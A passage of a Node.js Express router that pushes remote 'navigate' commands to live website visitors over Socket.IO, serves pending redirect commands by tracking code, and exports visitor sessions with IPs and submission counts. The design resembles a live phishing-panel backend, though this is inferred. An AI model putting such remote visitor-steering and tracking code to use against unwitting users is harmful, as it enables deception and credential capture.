      const tcIpKey = (ownerCodeForTc && ip) ? (ownerCodeForTc + '_' + ip) : '';

      const candidates = [sidKey, sidPrefixed, vidKey, vidIpKey, tcIpKey].filter(Boolean);
      const delivered = new Set();
      for (const k of candidates) {
        const socketId = sessionSockets[k];
        if (!socketId) continue;
        if (delivered.has(socketId)) continue;
        delivered.add(socketId);
        try { io.to(socketId).emit('session_command', command); } catch (_) {}
        try { io.to(socketId).emit('msg_push', msgPayload); } catch (_) {}
      }
      if (delivered.size === 0 && finalSession.trackingCode) {
        try {
          io.to('room_' + finalSession.trackingCode).emit('session_command', command);
          io.to('room_' + finalSession.trackingCode).emit('msg_push', msgPayload);
        } catch (_) {}
      }
      const ownerCode = (finalSession.trackingCode || '').split('_')[0];
      if (ownerCode) {
        try { io.to('room_' + ownerCode).emit('session_command', command); } catch (_) {}
      }
      emitMsgPushToOwnerRoom(io, finalSession.trackingCode, message, finalTargetUrl);
    }

    return res.json({
      success: true, message: 'Redirect command sent (vid preserved)',
      sessionId: String(finalSession._id),
      seq, pendingCommand,
      originalTargetUrl: rawTargetUrl,
      finalTargetUrl,
    });
  } catch (err) {
    console.error('[Sessions] redirect-new error:', err.message);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

router.get('/pending-command/:code', async (req, res) => {
  try {
    const code = req.params.code || '';
    const sid = req.query.sid || req.query.sessionId || '';
    const vid = req.query.visitorId || req.query.vid || '';
    const lastSeq = Number(req.query.seq || 0) || 0;

    let session = null;
    if (sid) session = await Session.findBySessionId(sid);
    if (!session && vid) session = await Session.findByVisitorId(vid);
    if (!session && code) session = await Session.findForCommandLookup(vid || null, code);
    if (!session) return res.json({ success: true, pending: false });

    const nowMs = Date.now();
    const pc = session.pendingCommand;
    if (pc && pc.url) {
      const expiresAt = pc.expiresAt ? new Date(pc.expiresAt).getTime() : 0;
      const notExpired = !expiresAt || expiresAt > nowMs;
      const pcSeq = Number(pc.seq || 0) || 0;
      if (notExpired && pcSeq > lastSeq) {
        return res.json({
          success: true, pending: true,
          command: {
            action: pc.action || 'navigate',
            url: pc.url, message: pc.message || '',
            seq: pcSeq,
            sessionId: String(session._id),
            visitorId: session.visitorId || '',
            trackingCode: session.trackingCode || '',
            timestamp: pc.timestamp || session.updated_at || new Date().toISOString(),
          },
        });
      }
    }

    const seq = Number(session.commandSeq || 0) || 0;
    if (seq <= lastSeq || !session.lastCommandUrl) {
      return res.json({ success: true, pending: false });
    }

    return res.json({
      success: true, pending: true,
      command: {
        action: session.lastCommand || 'navigate',
        url: session.lastCommandUrl,
        message: session.lastMessage || '',
        seq,
        sessionId: String(session._id),
        visitorId: session.visitorId || '',
        trackingCode: session.trackingCode || '',
        timestamp: session.updated_at || new Date().toISOString(),
      },
    });
  } catch (err) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

function csvEscape(value) {
  const s = value === undefined || value === null ? '' : String(value);
  if (s.includes('"') || s.includes(',') || s.includes('\n') || s.includes('\r')) {
    return '"' + s.replace(/"/g, '""') + '"';
  }
  return s;
}

router.get('/export', authenticate, async (req, res) => {
  try {
    let sessions = await getCachedSessions(true);
    sessions = dedupeSessions(sessions);
    sessions = await filterSessionsByRole(sessions, req.user);
    sessions = dedupeSessions(sessions);

    const rawFormat = (req.query.format || 'csv').toString().toLowerCase();
    const format = rawFormat === 'json' ? 'json' : 'csv';

    if (format === 'json') {
      return res.json({
        success: true, count: sessions.length,
        data: sessions.map(s => ({
          sessionId: s._id,
          visitorId: s.visitorId,
          trackingCode: s.trackingCode,
          ip: s.ip,
          device: s.deviceType,
          deviceClass: s.deviceClass,
          browser: s.browser,
          status: s.status,
          isLive: s.isLive,
          clicks: s.clicks || 0,
          submissions: s.submissions?.length || 0,
          created: s.created_at,
          lastSeen: s.lastActivity,
        })),
        timestamp: now(),
      });
    }

    const headers = ['Session ID', 'Visitor ID', 'Tracking Code', 'IP', 'Device', 'Browser', 'Status', 'Live', 'Clicks', 'Submissions', 'Created', 'Last Seen'];
    let csv = headers.map(csvEscape).join(',') + '\n';
    sessions.forEach(s => {
      csv += [
        csvEscape(s._id || ''),
        csvEscape(s.visitorId || ''),
        csvEscape(s.trackingCode || ''),
        csvEscape(s.ip || ''),
        csvEscape(s.deviceType || ''),
        csvEscape(s.browser || ''),
        csvEscape(s.status || ''),
        csvEscape(s.isLive ? 'Yes' : 'No'),
        csvEscape(s.clicks || 0),
        csvEscape(s.submissions?.length || 0),
        csvEscape(s.created_at || ''),
        csvEscape(s.lastActivity || ''),
      ].join(',') + '\n';
    });
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename=inbox_export_${Date.now()}.csv`);
    res.send(csv);
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

router.init = init;
router.stop = stop;
router.getIO = getIO;
router.getSessionSockets = getModuleSessionSockets;
router.getRemainingTimeMs = getRemainingTimeMs;
router.initializeGlobalTimer = initializeGlobalTimer;
router.globalInboxCleanup = globalInboxCleanup;
router.trashPermanentCleanup = trashPermanentCleanup;
router.getNextNoonBDMs = getNextNoonBDMs;
router.isNoonAligned = isNoonAligned;

module.exports = router;